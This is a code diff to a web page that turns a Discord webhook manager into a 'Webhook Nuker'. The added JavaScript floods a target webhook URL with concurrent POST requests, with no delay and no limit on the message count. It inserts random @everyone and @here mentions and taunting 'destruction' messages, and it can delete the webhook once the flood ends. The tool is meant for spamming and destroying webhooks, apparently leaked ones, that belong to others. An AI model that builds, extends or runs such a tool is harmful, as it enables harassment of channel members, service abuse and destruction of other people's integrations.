@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gazing Stars | Discord Webhook Manager</title>
+    <title>Gazing Stars | Ultimate Discord Webhook Nuker</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -54,7 +54,7 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 1000px;
             width: 100%;
             background: rgba(10, 10, 26, 0.7);
             border-radius: 20px;
@@ -154,7 +154,7 @@
             font-size: 1rem;
         }
         
-        input, textarea {
+        input, textarea, select {
             padding: 15px 20px;
             border-radius: 12px;
             border: 2px solid rgba(138, 43, 226, 0.3);
@@ -170,11 +170,11 @@
             resize: vertical;
         }
         
-        input:hover, textarea:hover {
+        input:hover, textarea:hover, select:hover {
             border-color: rgba(138, 43, 226, 0.5);
         }
         
-        input:focus, textarea:focus {
+        input:focus, textarea:focus, select:focus {
             outline: none;
             border-color: var(--primary);
             box-shadow: 0 0 0 4px rgba(138, 43, 226, 0.2);
@@ -473,6 +473,79 @@
         .toggle-options:hover {
             color: var(--light);
         }
+        
+        .advanced-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .option-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: rgba(30, 30, 50, 0.5);
+            border-radius: 12px;
+            margin-top: 1rem;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin: 0;
+        }
+        
+        .checkbox-group label {
+            font-size: 0.9rem;
+            font-weight: normal;
+        }
+        
+        .emoji-picker {
+            display: none;
+            position: absolute;
+            background: var(--dark);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            padding: 10px;
+            z-index: 100;
+            max-height: 200px;
+            overflow-y: auto;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .emoji-item {
+            padding: 5px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        
+        .emoji-item:hover {
+            background: var(--primary);
+        }
+        
+        .emoji-trigger {
+            cursor: pointer;
+            margin-left: 5px;
+        }
     </style>
 </head>
 <body>
@@ -482,7 +555,7 @@
     <div class="container floating">
         <header>
             <h1>Gazing Stars</h1>
-            <p class="subtitle">Advanced Discord webhook management tool</p>
+            <p class="subtitle">Ultimate Discord Webhook Nuker - Maximum Destruction</p>
         </header>
         
         <div class="webhook-form">
@@ -495,7 +568,7 @@
             </div>
             
             <button class="toggle-options" id="toggle-options">
-                <i class="fas fa-cog"></i> Customize Messages
+                <i class="fas fa-cog"></i> Advanced Nuke Configuration
             </button>
             
             <div class="message-options" id="message-options">
@@ -504,16 +577,72 @@
                         <i class="fas fa-comment"></i>
                         Test Message Content
                     </label>
-                    <textarea id="test-message" placeholder="Enter your test message content here">This is a test message from Gazing Stars Webhook Manager</textarea>
+                    <textarea id="test-message" placeholder="Enter your test message content here">This is a test message from Gazing Stars Webhook Nuker</textarea>
                 </div>
                 
                 <div class="input-group">
                     <label for="spam-message">
                         <i class="fas fa-bomb"></i>
                         NUKE Message Content
+                        <span class="emoji-trigger" onclick="toggleEmojiPicker('spam-message')">😀</span>
                     </label>
-                    <textarea id="spam-message" placeholder="Enter your spam message content here">🚀 NUKE SPAM from Gazing Stars - Message #{{COUNT}}</textarea>
+                    <textarea id="spam-message" placeholder="Enter your nuke message content here">💣 NUKE INCOMING 💣\n🚀 Message #{{COUNT}} from Gazing Stars Nuker\n🔥 Prepare for destruction! 🔥</textarea>
+                    <div class="emoji-picker" id="emoji-picker-spam-message"></div>
                 </div>
+                
+                <div class="advanced-options">
+                    <div class="option-group">
+                        <label for="spam-delay">
+                            <i class="fas fa-clock"></i>
+                            Delay Between Messages (ms)
+                        </label>
+                        <input type="number" id="spam-delay" min="0" max="10000" value="0" step="100">
+                    </div>
+                    
+                    <div class="option-group">
+                        <label for="spam-count">
+                            <i class="fas fa-hashtag"></i>
+                            Total Messages to Send (0 = unlimited)
+                        </label>
+                        <input type="number" id="spam-count" min="0" value="0">
+                    </div>
+                    
+                    <div class="option-group">
+                        <label for="spam-mode">
+                            <i class="fas fa-rocket"></i>
+                            Nuke Mode
+                        </label>
+                        <select id="spam-mode">
+                            <option value="normal">Normal Speed</option>
+                            <option value="fast">Fast (Max Speed)</option>
+                            <option value="flood">Flood (Multiple Requests)</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="random-content" checked>
+                    <label for="random-content">Randomize Message Content</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="use-embeds" checked>
+                    <label for="use-embeds">Include Embeds</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="use-mentions">
+                    <label for="use-mentions">Add Random Mentions</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auto-delete">
+                    <label for="auto-delete">Auto-Delete Webhook After Nuke</label>
+                </div>
+            </div>
+            
+            <div class="progress-container" id="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
             </div>
             
             <div class="button-group">
@@ -543,21 +672,50 @@
     </div>
     
     <footer>
-        <p>© 2025 Gazing Stars | Use Responsibly | <a href="#" style="color: var(--primary-light); text-decoration: none;">Privacy Policy</a></p>
+        <p>© 2025 Gazing Stars | Use Responsibly | <a href="#" style="color: var(--primary-light); text-decoration: none;">Terms of Service</a></p>
     </footer>
     
     <script>
+        
         let spamInterval;
         let messageCount = 0;
         let isSpamming = false;
         let lastUpdateTime = 0;
         let messagesPerSecond = 0;
         let messageQueue = [];
-        const MAX_QUEUE_SIZE = 100;
+        const MAX_QUEUE_SIZE = 50;
+        const MAX_CONCURRENT_REQUESTS = 10;
+        let activeRequests = 0;
+        let emojis = ["😀", "😈", "💀", "👿", "🤡", "💣", "🔥", "🚀", "☠️", "💥", "👹", "👺", "🤯", "😱", "👎"];
+        
+        
+        const randomMessages = [
+            "Your webhook has been nuked by Gazing Stars!",
+            "Say goodbye to this channel! 💥",
+            "Webhook destruction in progress...",
+            "This is what happens when you leak webhooks!",
+            "💣 BOOM! Another message delivered!",
+            "🚀 Preparing for total annihilation!",
+            "Your webhook is being obliterated!",
+            "This is message {{COUNT}} of your doom!",
+            "☠️ RIP this webhook!",
+            "🔥 Burning this webhook to the ground!",
+            "👿 Evil laughter intensifies!",
+            "🤡 Did you really think your webhook was safe?",
+            "💀 Say hello to my little friend!",
+            "😱 SURPRISE! Webhook nuke incoming!",
+            "👎 This webhook is going down!"
+        ];
+        
+        
+        const randomMentions = [
+            "@everyone", "@here", "<@123456789012345678>", "<@987654321098765432>", 
+            "<@&123456789012345678>", "<@&987654321098765432>", "<@!123456789012345678>"
+        ];
         
         function createStars() {
             const starsContainer = document.getElementById('stars');
-            const starCount = 150;
+            const starCount = 200;
             
             for (let i = 0; i < starCount; i++) {
                 const star = document.createElement('div');
@@ -585,14 +743,14 @@
         
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
-            const particleCount = 10;
+            const particleCount = 15;
             
             for (let i = 0; i < particleCount; i++) {
                 const particle = document.createElement('div');
                 particle.classList.add('particle');
                 particle.classList.add(`delay-${i % 3 + 1}`);
                 
-                const size = Math.random() * 200 + 100;
+                const size = Math.random() * 300 + 150;
                 const x = Math.random() * 100;
                 const y = Math.random() * 100;
                 
@@ -637,23 +795,30 @@
             try {
                 stopSpamming();
                 const testMessage = document.getElementById('test-message').value;
+                const useEmbeds = document.getElementById('use-embeds').checked;
+                
+                const payload = {
+                    content: testMessage
+                };
+                
+                if (useEmbeds) {
+                    payload.embeds = [{
+                        title: "Webhook Test Successful",
+                        description: "This webhook is working properly!",
+                        color: 0x8A2BE2,
+                        footer: {
+                            text: "Gazing Stars Webhook Nuker"
+                        },
+                        timestamp: new Date().toISOString()
+                    }];
+                }
+                
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        content: testMessage,
-                        embeds: [{
-                            title: "Webhook Test Successful",
-                            description: "This webhook is working properly!",
-                            color: 0x8A2BE2,
-                            footer: {
-                                text: "Gazing Stars Webhook Manager"
-                            },
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
+                    body: JSON.stringify(payload)
                 });
                 
                 if (response.ok) {
@@ -673,6 +838,47 @@
             }
         }
         
+        function generateRandomMessage(baseMessage, count) {
+            const randomContent = document.getElementById('random-content').checked;
+            const useMentions = document.getElementById('use-mentions').checked;
+            
+            let message = baseMessage.replace('{{COUNT}}', count);
+            
+            if (randomContent) {
+                const randomMsg = randomMessages[Math.floor(Math.random() * randomMessages.length)];
+                message = randomMsg.replace('{{COUNT}}', count);
+            }
+            
+            if (useMentions) {
+                const mention = randomMentions[Math.floor(Math.random() * randomMentions.length)];
+                message = `${mention} ${message}`;
+            }
+            
+            
+            if (Math.random() > 0.5) {
+                const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+                message += ` ${emoji}`;
+            }
+            
+            return message;
+        }
+        
+        function generateRandomEmbed(count) {
+            const colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF];
+            const adjectives = ["Destructive", "Powerful", "Deadly", "Lethal", "Devastating", "Catastrophic"];
+            const nouns = ["Nuke", "Bomb", "Missile", "Warhead", "Explosion", "Disaster"];
+            
+            return {
+                title: `${adjectives[Math.floor(Math.random() * adjectives.length)]} ${nouns[Math.floor(Math.random() * nouns.length)]}`,
+                description: `This is embed ${count} of the webhook nuke!\n\nWebhook will be spammed until page is closed or webhook is deleted.`,
+                color: colors[Math.floor(Math.random() * colors.length)],
+                footer: {
+                    text: "Gazing Stars Webhook NUKE"
+                },
+                timestamp: new Date().toISOString()
+            };
+        }
+        
         async function sendSpamMessage(url) {
             try {
                 const now = Date.now();
@@ -681,36 +887,70 @@
                     lastUpdateTime = now;
                 }
                 
-                const spamMessage = document.getElementById('spam-message').value.replace('{{COUNT}}', messageCount+1);
+                const spamMessage = generateRandomMessage(
+                    document.getElementById('spam-message').value, 
+                    messageCount + 1
+                );
                 
-                const request = fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: spamMessage,
-                        embeds: [{
-                            title: "WEBHOOK NUKE IN PROGRESS",
-                            description: `This is rapid-fire message ${messageCount+1}\n\nWebhook will be spammed until page is closed or webhook is deleted.`,
-                            color: 0xFF4444,
-                            footer: {
-                                text: "Gazing Stars Webhook NUKE"
-                            },
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).then(response => {
+                const useEmbeds = document.getElementById('use-embeds').checked;
+                
+                const payload = {
+                    content: spamMessage
+                };
+                
+                if (useEmbeds) {
+                    payload.embeds = [generateRandomEmbed(messageCount + 1)];
+                }
+                
+                const spamMode = document.getElementById('spam-mode').value;
+                const spamCount = parseInt(document.getElementById('spam-count').value);
+                
+                
+                if (spamCount > 0) {
+                    const progress = Math.min(100, Math.round((messageCount / spamCount) * 100));
+                    document.getElementById('progress-bar').style.width = `${progress}%`;
+                }
+                
+                
+                if (spamCount > 0 && messageCount >= spamCount) {
+                    stopSpamming();
+                    if (document.getElementById('auto-delete').checked) {
+                        await deleteWebhook(url);
+                    }
+                    return false;
+                }
+                
+               
+                if (spamMode === 'flood' && activeRequests < MAX_CONCURRENT_REQUESTS) {
+                    activeRequests++;
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    }).then(response => {
+                        activeRequests--;
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+                        return response;
+                    }).catch(error => {
+                        activeRequests--;
+                        throw error;
+                    });
+                } else {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
                     if (!response.ok) {
                         throw new Error(`HTTP error! status: ${response.status}`);
                     }
-                    return response;
-                });
-                
-                messageQueue.push(request);
-                if (messageQueue.length > MAX_QUEUE_SIZE) {
-                    await Promise.all(messageQueue);
-                    messageQueue = [];
                 }
                 
                 messageCount++;
@@ -737,19 +977,47 @@
             messageCount = 0;
             messagesPerSecond = 0;
             lastUpdateTime = Date.now();
+            
             document.getElementById('counter').style.display = 'block';
             document.getElementById('spam-btn').classList.add('pulse');
             document.getElementById('spam-btn').innerHTML = '<i class="fas fa-stop"></i> STOP NUKE';
             
+            const spamCount = parseInt(document.getElementById('spam-count').value);
+            if (spamCount > 0) {
+                document.getElementById('progress-container').style.display = 'block';
+                document.getElementById('progress-bar').style.width = '0%';
+            }
+            
             showResult('💣 NUKE ACTIVATED - Spamming webhook at maximum speed...', true);
             
-            const spamLoop = async () => {
-                if (!isSpamming) return;
-                await sendSpamMessage(url);
-                setTimeout(spamLoop, 1);
-            };
+            const spamMode = document.getElementById('spam-mode').value;
+            const delay = parseInt(document.getElementById('spam-delay').value);
             
-            spamLoop();
+            if (spamMode === 'flood') {
+                
+                const floodSpam = () => {
+                    if (!isSpamming) return;
+                    
+                    for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
+                        sendSpamMessage(url);
+                    }
+                    
+                    setTimeout(floodSpam, delay);
+                };
+                
+                floodSpam();
+            } else {
+                
+                const spamLoop = async () => {
+                    if (!isSpamming) return;
+                    await sendSpamMessage(url);
+                    
+                    const effectiveDelay = spamMode === 'fast' ? 0 : delay;
+                    setTimeout(spamLoop, effectiveDelay);
+                };
+                
+                spamLoop();
+            }
         }
         
         function stopSpamming() {
@@ -758,12 +1026,56 @@
             isSpamming = false;
             document.getElementById('spam-btn').classList.remove('pulse');
             document.getElementById('spam-btn').innerHTML = '<i class="fas fa-bomb"></i> NUKE Webhook';
+            document.getElementById('progress-container').style.display = 'none';
+            
             showResult(`☢️ NUKE COMPLETE - Sent ${messageCount} messages`, true);
+        }
+        
+        function toggleEmojiPicker(targetId) {
+            const picker = document.getElementById(`emoji-picker-${targetId}`);
+            const isVisible = picker.style.display === 'block';
+            
+           
+            document.querySelectorAll('.emoji-picker').forEach(p => {
+                p.style.display = 'none';
+            });
+            
+            if (!isVisible) {
+                picker.style.display = 'block';
+                if (picker.innerHTML === '') {
+                    
+                    emojis.forEach(emoji => {
+                        const emojiItem = document.createElement('div');
+                        emojiItem.classList.add('emoji-item');
+                        emojiItem.textContent = emoji;
+                        emojiItem.onclick = () => {
+                            const textarea = document.getElementById(targetId);
+                            textarea.value += emoji;
+                            picker.style.display = 'none';
+                        };
+                        picker.appendChild(emojiItem);
+                    });
+                }
+            } else {
+                picker.style.display = 'none';
+            }
         }
         
         document.getElementById('toggle-options').addEventListener('click', () => {
             const options = document.getElementById('message-options');
             options.style.display = options.style.display === 'none' ? 'block' : 'none';
+            this.innerHTML = options.style.display === 'none' ? 
+                '<i class="fas fa-cog"></i> Show Advanced Options' : 
+                '<i class="fas fa-cog"></i> Hide Advanced Options';
+        });
+        
+        
+        document.addEventListener('click', (e) => {
+            if (!e.target.classList.contains('emoji-trigger')) {
+                document.querySelectorAll('.emoji-picker').forEach(picker => {
+                    picker.style.display = 'none';
+                });
+            }
         });
         
         const deleteBtn = document.getElementById('delete-btn');
@@ -820,7 +1132,7 @@
             const url = webhookUrlInput.value.trim();
             
             if (!url) {
-                showResult('Please enter a webhook URL to spam', false);
+                showResult('Please enter a webhook URL to nuke', false);
                 return;
             }
             
@@ -831,6 +1143,16 @@
             
             if (isSpamming) {
                 stopSpamming();
+                return;
+            }
+            
+           
+            showLoading();
+            const testResult = await testWebhook(url);
+            hideLoading();
+            
+            if (!testResult.success) {
+                showResult(testResult.message, false);
                 return;
             }
             
